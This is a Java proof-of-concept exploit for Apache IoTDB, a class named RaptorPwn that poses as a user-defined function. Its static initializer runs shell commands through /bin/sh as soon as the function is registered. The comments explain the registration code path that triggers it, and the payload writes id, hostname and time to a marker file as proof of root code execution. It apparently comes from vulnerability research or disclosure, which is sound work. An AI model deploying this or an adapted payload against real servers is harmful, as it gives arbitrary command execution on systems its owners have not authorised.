package org.apache.iotdb.raptor;

import org.apache.iotdb.udf.api.UDTF;
import org.apache.iotdb.udf.api.access.Row;
import org.apache.iotdb.udf.api.collector.PointCollector;
import org.apache.iotdb.udf.api.customizer.config.UDTFConfigurations;
import org.apache.iotdb.udf.api.customizer.parameter.UDFParameters;

// Proof-of-execution UDF. The static initializer runs at CREATE FUNCTION registration
// because UDFManagementService.reflectAndGetUDF calls
// Class.forName(className, true, classLoader) at line 178, then newInstance() at 181.
// No query invocation is required. Payload writes a marker file (arbitrary code
// execution in the server process = container root). Non-destructive.
public class RaptorPwn implements UDTF {
  static {
    try {
      String out = "/tmp/RAPTOR_RCE_PROOF.txt";
      Process p = new ProcessBuilder("/bin/sh", "-c",
          "echo RAPTOR_RCE $(id) $(hostname) $(date -u +%Y-%m-%dT%H:%M:%SZ) > " + out + " 2>&1").start();
      p.waitFor();
    } catch (Throwable t) {
      try {
        java.nio.file.Files.write(java.nio.file.Paths.get("/tmp/RAPTOR_RCE_PROOF.txt"),
            ("static-init-ran-but-exec-failed: " + t).getBytes());
      } catch (Throwable ignored) {}
    }
  }
  @Override public void beforeStart(UDFParameters p, UDTFConfigurations c) throws Exception {}
  @Override public void transform(Row row, PointCollector collector) throws Exception {}
}
